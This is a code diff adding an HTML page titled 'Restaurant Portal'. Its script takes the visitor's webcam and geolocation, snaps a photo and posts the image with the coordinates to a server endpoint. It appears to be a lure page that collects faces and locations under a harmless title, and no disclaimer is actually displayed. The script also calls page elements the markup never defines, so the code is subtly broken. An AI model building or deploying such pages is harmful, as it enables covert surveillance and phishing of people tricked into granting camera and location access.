@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Restaurant Portal</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        .disclaimer { background-color: #fff3cd; color: #856404; padding: 15px; border: 1px solid #ffeeba; margin-bottom: 20px; font-weight: bold; }
+        video { border: 2px solid #ccc; border-radius: 8px; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <script>
+        const video = document.getElementById('videoFeed');
+        const canvas = document.getElementById('photoCanvas');
+        const statusText = document.getElementById('statusMessage');
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => { 
+                video.srcObject = stream; 
+                statusText.innerText = "Gathering data...";
+                statusText.style.color = "black";
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            captureAndSend({
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
+                            });
+                        },
+                        (error) => {
+                            statusText.innerText = "Location access denied.";
+                            statusText.style.color = "red";
+                        }
+                    );
+                }
+            })
+            .catch(err => {
+                statusText.innerText = "Camera access denied.";
+                statusText.style.color = "red";
+            });
+
+        function captureAndSend(locationData) {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            // Notice the URL is /api/save-data
+            fetch('/api/save-data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: imageData, location: locationData })
+            })
+            .then(response => response.json())
+            .then(data => {
+                statusText.innerText = "Success! Data sent.";
+                statusText.style.color = "green";
+                console.log("Saved at:", data.imageUrl);
+            })
+            .catch(err => {
+                statusText.innerText = "Error sending data.";
+                statusText.style.color = "red";
+            });
+        }
+    </script>
+</body>
+</html>
